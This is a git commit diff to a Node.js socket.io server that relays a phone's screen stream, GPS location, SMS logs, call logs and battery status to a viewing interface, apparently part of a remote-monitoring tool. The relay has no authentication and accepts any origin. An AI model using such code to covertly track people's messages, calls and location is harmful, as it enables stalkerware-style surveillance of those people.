e654410d3a7e8a80e671bfa3226373a119175c53
sekharathome <58811293+sekharathome@users.noreply.github.com>
2026-01-18 22:57:28 +0530

    Update server.js

--- server.js
+++ server.js
@@ -10,25 +10,33 @@ const io = new Server(server, { cors: { origin: "*" } });
 app.use(express.static(path.join(__dirname, 'public')));
 
 io.on('connection', (socket) => {
-    // Mirroring relays
+    console.log('Client connected');
+
+    // --- Screen Mirroring Relays ---
     socket.on('request-screen-view', () => socket.broadcast.emit('request-screen-view'));
     socket.on('stop-mirroring', () => socket.broadcast.emit('stop-mirroring'));
     socket.on('screen-status', (status) => socket.broadcast.emit('screen-status', status));
-    
-    // This is the raw image data relay
     socket.on('screen-data', (data) => socket.broadcast.emit('ui-screen-stream', data));
 
-    // Data Relays
+    // --- GPS / Location Relays ---
+    socket.on('start-gps-stream', () => socket.broadcast.emit('start-gps-stream'));
+    socket.on('stop-gps-stream', () => socket.broadcast.emit('stop-gps-stream'));
+    socket.on('gps-update', (data) => socket.broadcast.emit('ui-gps', data));
+
+    // --- Data Relays ---
     socket.on('battery-status', (data) => socket.broadcast.emit('ui-battery', data));
     socket.on('sms-data-log', (data) => socket.broadcast.emit('ui-sms-display', data));
     socket.on('call-log-data', (data) => socket.broadcast.emit('ui-calls-display', data));
-    socket.on('gps-update', (data) => socket.broadcast.emit('ui-gps', data));
     
-    // ...
+    // --- Connection Events ---
+    socket.on('get-sms-request', () => socket.broadcast.emit('get-sms-request'));
+    socket.on('get-calls-request', () => socket.broadcast.emit('get-calls-request'));
+    
+    socket.on('disconnect', () => {
+        console.log('Client disconnected');
+    });
 });
-server.listen(process.env.PORT || 3000);
 
-
-
-
-
+server.listen(process.env.PORT || 3000, () => {
+    console.log('Server running on port 3000');
+});
